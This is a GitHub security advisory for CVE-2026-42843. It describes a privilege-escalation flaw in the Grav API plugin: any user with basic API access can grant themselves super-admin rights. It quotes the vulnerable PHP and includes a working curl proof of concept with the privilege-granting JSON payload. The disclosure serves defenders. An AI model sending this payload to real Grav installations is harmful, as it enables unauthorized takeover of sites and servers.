# [H] Grav API Privilege Escalation to Super Admin

## Summary
Severity: High
Advisory: GHSA-r945-h4vm-h736
CVE: CVE-2026-42843
CWE: CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-r945-h4vm-h736
Type: github-advisory

## Affected
- Packagist: `getgrav/grav-plugin-api` — affected >=0 <1.0.0-beta.15

## Details
### Summary

An insecure direct object reference and logic flaw in the Grav API plugin (`UsersController::update`) allows any authenticated user with basic API access (`api.access`) to modify their own permission configuration. An attacker can exploit this to escalate their privileges to Super Administrator (`admin.super` and `api.super`), leading to full system compromise and potential RCE.

### Details

The vulnerability is located in `user/plugins/api/classes/Api/Controllers/UsersController.php` within the `update` method.

The API allows users to update their own profiles if they possess the basic `api.access` permission:

```php
// UsersController.php -> update()
$isSelf = $currentUser->username === $username;
if (!$isSelf) {
    $this->requirePermission($request, 'api.users.write');
} else {
    // Self-edit only requires api.access
    $this->requirePermission($request, 'api.access');
}
```

However, when filtering the fields that are allowed to be updated via a `PATCH` request, the `access` field (which defines the user's role and permissions) is indiscriminately included in the `$allowedFields` whitelist for all users:

```php
// Partial update - only update provided fields
$allowedFields = ['email', 'fullname', 'title', 'state', 'language', 'content_editor', 'access', 'twofa_enabled'];
foreach ($allowedFields as $field) {
    if (array_key_exists($field, $body)) {
        $user->set($field, $body[$field]);
    }
}
```

Because there is no secondary check to verify if the user attempting to modify the `access` field is already an administrator, any low-privileged user can overwrite their own `access` object with a malicious payload granting themselves `super: true`.

### PoC

1. **Prerequisites**: You need a low-privileged user account (eg. `user1`) that possesses the basic `api.access` permission.

2. **Obtain JWT**: Authenticate to the API to obtain your `access_token`:

   ```bash
   curl -X POST http://<target>/api/v1/auth/token \
     -H "Content-Type: application/json" \
     -d '{"username":"user1","password":"your_password"}'
   ```

3. **Exploit**: Send a `PATCH` request to the user update endpoint. 

   ```bash
   curl -X PATCH http://<target>/api/v1/users/user1 \
     -H "X-API-Token: <your_access_token>" \
     -H "Content-Type: application/json" \
     -d "{\"access\":{\"admin\":{\"login\":true,\"super\":true},\"api\":{\"access\":true,\"super\":true},\"site\":{\"login\":true}}}"
   ```

4. **Verification**: Log in to the Grav Admin panel using the user credentials. You will now have full Super Administrator privileges.

### Impact

This is a vertical Privilege Escalation vulnerability. Any user with baseline API access can elevate themselves to Super Admin. Once Super Admin privileges are obtained, the attacker takes complete control over the CMS. They can modify content, alter configurations, upload malicious plugins, or edit Twig templates outside of the sandbox to achieve RCE on the server.

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-r945-h4vm-h736
- https://nvd.nist.gov/vuln/detail/CVE-2026-42843
- https://github.com/getgrav/grav-plugin-api/commit/26f529c7d438c73343e82311fb095caeaf1a6116
- https://github.com/getgrav/grav
